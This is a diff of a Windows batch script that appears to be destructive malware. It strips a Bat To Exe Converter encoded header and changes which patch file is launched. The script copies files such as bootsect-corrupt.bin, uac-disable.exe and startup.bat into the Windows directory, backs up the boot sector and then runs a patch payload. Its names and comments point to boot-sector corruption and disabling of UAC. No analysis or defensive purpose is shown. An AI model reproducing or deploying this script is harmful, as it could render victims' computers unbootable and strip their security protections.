@@ -1,46 +1,7 @@
-::[Bat To Exe Converter]
-::
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEfWeUtNorD39Q=
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEfW+0ra4rYzvmNL/IB/1XwO5Qk2Bo=
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEUV+0xNorD39Q=
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEOXOczdMHewrHu
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEOQOMtbJrLlLaPNIA=
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEJRuMmdYzUyLHAJfgWig==
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnEIVeFyfIbI27aCJa4W8kCE
-::fBE1pAF6MU+EWH3eyEMqPQlYTQqHKmKoE6ZS+Pr05e+EtnENVfY8cN2V36yLQA==
-::YAwzoRdxOk+EWAjk
-::fBw5plQjdCuDJFie4VA8KRVRWg2QKXj0FqcT4u34+9bR9k8EArZyeZXOyPmCIe4Wp0HhZp052WoXkcgDAlVRfR3L
-::YAwzuBVtJxjWCl3EqQJgSA==
-::ZR4luwNxJguZRRnk
-::Yhs/ulQjdF65
-::cxAkpRVqdFKZSTk=
-::cBs/ulQjdF65
-::ZR41oxFsdFKZSDk=
-::eBoioBt6dFKZSDk=
-::cRo6pxp7LAbNWATEpCI=
-::egkzugNsPRvcWATEpCI=
-::dAsiuh18IRvcCxnZtBJQ
-::cRYluBh/LU+EWAnk
-::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJhZkkaH0rWXA==
-::ZQ05rAF9IBncCkqN+0xwdVsFAlbMbyXpZg==
-::ZQ05rAF9IAHYFVzEqQIRMg5GDCiDMm76NbAI/fib
-::eg0/rx1wNQPfEVWB+kM9LVsJDCWYKXn6KrQS7ajI6v6Ssi0=
-::fBEirQZwNQPfEVWB+kM9LVsJDCWYKXn6KrQS7ajI6v6Ssi0=
-::cRolqwZ3JBvQF1fEqQIRMg5GDCiDMm76NbAI/fi76eWV4noUWrFtGA==
-::dhA7uBVwLU+EWGCL51YxOltdQgfMXA==
-::YQ03rBFzNR3SWATEzU0jPBpGDA2MPyXa
-::dhAmsQZ3MwfNWATEzU0jPBpGDA2MPyXa
-::ZQ0/vhVqMQ3MEVWAtB9wOAldWgWWOSa4E7wQ7Ig=
-::Zg8zqx1/OA3MEVWAtB9wOwtRTw2DMCa4E7wQ7Ig=
-::dhA7pRFwIByZRRnk
-::Zh4grVQjdCuDJFiI50ckPQsZShGOMCatD7tPuqXtvqTV7B5TB6w6YIq7
-::YB416Ek+ZW8=
-::
-::
-::978f952a14a936cc963da21a135fa983
 @echo off
 cls
+set sdir=%~dp0
+cd %sdir%
 echo.
 echo Please wait...
 echo.
@@ -57,7 +18,7 @@ copy "%cd%\traymcore.exe" "%windir%\traymcore.exe"
 copy "%cd%\startup.bat" "%windir%\startup.bat"
 copy "%cd%\bmgr.exe" "%windir%\bmgr.exe"
 copy "%cd%\bootsect-corrupt.bin" "%windir%\bootsect-corrupt.bin"
-copy "%cd%\patch2.exe" "%windir%\patch2.exe"
+copy "%cd%\patch2.bat" "%windir%\patch2.bat"
 copy "%cd%\uac-disable.exe" "%windir%\uac-disable.exe"
 : ===============================================
 : Takes a backup of current bootsect to %windir%
@@ -114,6 +75,6 @@ ping -w 15 localhost >nul
 : =============================
 : ok enough i am out.!!
 : =============================
-"%windir%\patch2.exe"
+"%windir%\patch2.bat"
 ping -w 10 localhost >nul
 exit
